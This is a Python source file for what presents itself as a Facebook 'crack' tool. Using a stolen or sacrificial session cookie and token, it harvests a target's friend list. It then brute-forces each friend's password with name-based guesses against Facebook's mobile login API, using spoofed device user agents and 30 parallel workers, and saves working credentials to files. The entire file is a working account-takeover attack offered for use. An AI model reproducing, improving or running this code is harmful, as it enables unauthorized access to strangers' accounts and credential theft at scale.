        da7 = (f"Dalvik/2.1.0 (Linux; U; Android {str(rr(2,13))}.{str(rr(1,3))}.0; {device_realme} Build/{build}) [FBAN/MessengerLite;FBAV/{str(rr(50,347))}.317.0.0.1.73;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/980652756;FBCR/;FBMF/Realme;FBBD/Realme;FBDV/{versi_android};FBSV/{str(rr(2,12))}.{str(rr(1,2))}.0;FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=2.25,height=1600,width=720};]")
          
        return random.choice([da1,da2,da4,da5,da6,da7])

	
class Memek:

#TOLS LORD UDIN - V 1.2#
#OWNER DHANZ REAL 1#
#PENGEMBANG LORD UDIN SADBOY###)#aoshwkabsnav#+#

    def __init__(self):

        self.id1, self.id2 = [], []

        self.ses = requests.Session()

        self.ok, self.cp, self.loop = [], [], 0

        self.dump_id()

   



    def convert(self, url):

        if "me" in url or "100" in url:

            return url

        elif "https" in url or "facebook" in url:

            user = url.split('/')[3]

            data = self.ses.get(f"https://mbasic.facebook.com/{user}").text

            xxxx = re.findall(";rid=(\d+)&amp;",str(data))[0]

            return xxxx

        else:

            ytta = self.ses.get(f"https://mbasic.facebook.com/{url}").text

            meme = re.findall(";rid=(\d+)&amp;",str(ytta))[0]

            return meme



    

    def logo(self):

        if "linux" in sys.platform.lower():

            try:os.system("clear")

            except:pass

        elif "win" in sys.platform.lower():

            try:os.system("cls")

            except:pass

        else:

            try:os.system("clear")

            except:pass

            

    def logo2(self):

    	print(f"""{P}\t         

{H}d8888b. db   db  .d8b.  d8b   db d88888D 
88  `8D 88   88 d8' `8b 888o  88 YP  d8'  {M}P
{M}88   88 88ooo88 88ooo88 88V8o 88    d8'   {P}R
88   88 88~~~88 88~~~88 88 V8o88   d8'    {K}O
{K}88  .8D 88   88 88   88 88  V888  d8' db 
Y8888D' YP   YP YP   YP VP   V8P d88888P 
                                         
Script By : Dhanz-XD
==================
Made In : Indonesia
==================
Tols : Crack Facebook 
==================
\n{P}SCRIPT CRACK FACEBOOK EASY FACEBOOK{P}""")

            

         

    def kentod(self, integer):

        lis = list("1234567890")

        gets = [random.choice(lis) for _ in range(integer)]

        return "".join(gets).upper()



    def ngoxok(self, cooz):

        coki = "datr=" + cooz["datr"] + ";" + ("sb=" + cooz["sb"]) + ";" + "locale=en_GB" + ";" + ("c_user=" + cooz["c_user"]) + ";" + ("xs=" + cooz["xs"]) + ";" + ("fr=" + cooz["fr"]) + ";"

        return(str(coki))


#----METOD B API DHANZ-XD ----#
    def metode(self, user, pasw):
    	#global ok,cp,loop
        sys.stdout.write(f"\r{N}{P}[Crack]{N} {self.loop}|{N}OK :-{H}{len(self.ok)}{N} = {N}CP :-{K}{len(self.cp)}{N} ")
        sys.stdout.flush()
        for pw in pasw:
            try:
                ses=requests.Session()
                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                application_version_code=str(random.randint(000000000,999999999))
                version = str(random.randrange(8,15))
                osv = str(random.randrange(1,9))
                osvx = str(random.randrange(1,15))
                osv1 = str(random.randrange(1,9))
                osv2 = str(random.randrange(1,9))
                abv = ['A','B','C']
                if '8' in version:
                	ipsw = '12'+random.choice(abv)+str(random.randint(11,99))
                elif '9' in version:
                	ipsw = '13'+random.choice(abv)+str(random.randint(11,99))
                elif '10' in version:
                	ipsw = '14'+random.choice(abv)+str(random.randint(11,99))
                elif '11' in version:
                	ipsw = '15'+random.choice(abv)+str(random.randint(11,99))
                elif '12' in version:
                	ipsw = '16'+random.choice(abv)+str(random.randint(11,99))
                elif '13' in version:
                	ipsw = '17'+random.choice(abv)+str(random.randint(11,99))
                elif '14' in version:
                	ipsw = '18'+random.choice(abv)+str(random.randint(11,99))
                elif '15' in version:
                	ipsw = '19'+random.choice(abv)+str(random.randint(11,99))
                ua_ios = 'Mozilla/5.0 (iPhone, CPU iPhone '+version+'_'+osv+' like Mac OS '+version+') AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/'+ipsw+f' [FBAN/MessengerLiteForiOS;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDV/iPhone{str(version)},{str(osv)};FBMD/iPhone;FBSN/iOS;FBSV/{str(version)}.{str(osv)}.{str(osv)};FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/{str(application_version_code)}]'
                fbs=random.choice(['com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite'])
                #ua = UserDhanzBase()
                ua = random.choice(ugen)
                ua = random.choice(ugen2)
                adid = str(uuid.uuid4())
                gtt=random.choice(xxxxx)
                gttt=random.choice(xxxxx)
                device_id = str(uuid.uuid4())
                data = {'adid':adid,

                                        'email':user,

                                        'password':pw,

                                        'cpl':'true',

                                        'credentials_type':'device_based_login_password',

                                        "source": "device_based_login",

                                        'error_detail_type':'button_with_disabled',

                                        'source':'login','format':'json',

                                        'generate_session_cookies':'1',

                                        'generate_analytics_claim':'1',

                                        'generate_machine_id':'1',

                                        "locale":"en_US","client_country_code":"US",

                                        'device':gtt,

                                        'device_id':device_id,

                                        "method": "auth.login",

                                        "fb_api_req_friendly_name": "authenticate",

                                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}

                head = {

                                        'content-type':'application/x-www-form-urlencoded',

                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),

                                        'x-fb-connection-type':'unknown',

                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',

                                        'user-agent':ua_ios,

                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),

                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),

                                        'x-fb-connection-quality':'EXCELLENT',

                                        'x-fb-friendly-name':'authenticate',

                                        'accept-encoding':'gzip, deflate',

                                        'x-fb-http-engine':     'Liger'}

                url = 'https://b-api.facebook.com/method/auth.login'

                po = requests.post(url,data=data,headers=head,allow_redirects=False).text

                hasl = json.loads(po)

                #exit(hasl)

                if "session_key" in hasl:

                                        

                    print(f"\r{H}[DZ-OK]{user}|{pw}  • {tahun(user)} • {ua}")

                    
                    wrt = (f" [✓] {user}|{pw}")

                    self.ok.append(wrt)

                    open('/sdcard/OK.txt','a').write(wrt+'\n')

                    break

                elif "www.facebook.com" in hasl["error_msg"]:

                    print(f"\r{K}[DZ-CP]{user}|{pw}  • {tahun(user)} • {ua}")

                      

                    wrt = (f" [×] {user}|{pw}")

                    self.cp.append(wrt)

                    open('/sdcard/CP.txt','a').write(wrt+'\n')

                    break

                else:

                    continue

            except requests.exceptions.ConnectionError:time.sleep(10)

         #   except Exception as e:prints(e)



        self.loop += 1

    def login_cokie(self, cok):
        try:
            data = self.ses.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cok})
            find_token = re.search("(EAAG\w+)", data.text)
            get = self.ses.get('https://graph.facebook.com/me?fields=name,id&access_token=%s'%(find_token.group(1)),cookies={"cookie": cok}).json()
            open('.token.txt', 'a').write(find_token.group(1));open('.cookie.txt', 'a').write(cok)
            prints()
            prints(f"""[[green]✓[/]] selamat [green]{get['name']}[/] cookie kamu valid!
[[bold red]>[/]] gunakan dengan bijak yah tools nya!""");time.sleep(0.3)            
            os.system('clear')
            input('Enter Untuk Convert Cokies')
            print('Otw Convert Tokennya Biar Bisa Dump')
            token1()
            exit()
        except requests.exceptions.ConnectionError:
            prints("😭 Tidak ada koneksi internet");exit()
        except (KeyError,AttributeError):
            prints("😔 Cookie kamu invalid");exit()
            
    
    def dump_id(self):
        os.system("clear")
        self.logo2()
        print("----------------------------------------------")       
        try:
            cook = {"cookie": open(".cookie.txt", "r").read()};took = open(".token.txt", "r").read()
        except FileNotFoundError:
            self.cookie()
        try:
            ishx = self.ses.get('https://graph.facebook.com/me?fields=name,id&access_token=%s'%(took),cookies=cook).json()
            nama = ishx["name"]
            idfb = ishx["id"]
        except requests.exceptions.ConnectionError:
            exit("😔 Tidak ada koneksi")
        except KeyError:
            try:os.remove(".cookie.txt");os.remove(".token.txt")
            except:pass
            prints("😢 opshh akun tumbal mu terkena checkpoint, silahkan login dengan akun lain.");time.sleep(3);exit()
        
        print(f"""nama  : {nama}
id fb : {idfb}
----------------------------------------------""")
        prints(f"Aidih Target")
        try:user = input("Masukan TargetLah kontol :  "); uid = self.convert(user)
        except (KeyError, IndexError):exit("[!] username atau id tidak benar")
        print("----------------------------------------------")
        try:
            tol = self.ses.get(f"https://graph.facebook.com/{uid}?fields=friends.fields(id,name).limit(5000)&access_token={took}",cookies=cook).json()
            for x in tol["friends"]["data"]:
                self.id1.append(x["id"]+"|"+x["name"])
                titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
                for x in titik:
                    sys.stdout.write(f"\r[{M}*{N}] sedang mengumpulkan dosa {H}{len(self.id1)}{N} id{x}{N}");sys.stdout.flush()
        except KeyError:
            exit(f"{N}[{M}×{N}] gagal mengambil aidi, kemungkinan aidi tidaklah publik")
        print(f"\n[*] Total aidi: {len(self.id1)}")
        for ih in self.id1:
            self.id2.insert(0, ih)
        self.mek()
        
    def mek(self):
    	os.system("clear")
    	self.logo2()
    	print("----------------------------------------------")
    	prints(f'{P2}Crack Starting {M2}>{K2}>{H2}>{P2} Methode{M2} >{K2}>{H2}> {M2}M1{M2} >{K2}>{H2}> {M2}{len(self.id1)}{P2} ')    	
    
    	print("----------------------------------------------")
    	self.password()

    	

    

    def password(self):

        with DhanzPro(max_workers=30) as bool:	

                for user in self.id2:

                    uid, udin01 = user.split("|")[0], user.split("|")[1].lower()

                    xxx = udin01.split(" ")[0]

                    if len(udin01) <=5:

                        if len(xxx) <=1 or len(xxx) <=2:pass

                        else:

                            pwx = [xxx+"123", xxx+"1234", xxx+"12345", xxx+"321", xxx+"03", xxx+"01", xxx+"02", xxx+"04", xxx+"06", xxx+"4321"]

                    else:

                        pwx = [udin01, xxx+"123", xxx+"1234", xxx+"12345", xxx+"321", xxx+"03", xxx+"01", xxx+"02", xxx+"04", xxx+"06", xxx+"4321"]

                    bool.submit(self.metode, uid, pwx)

                    



        exit()

    def cookie(self):
        self.logo()
        ahh = input("[?] cookie : ")
        self.login_cokie(ahh)

Memek()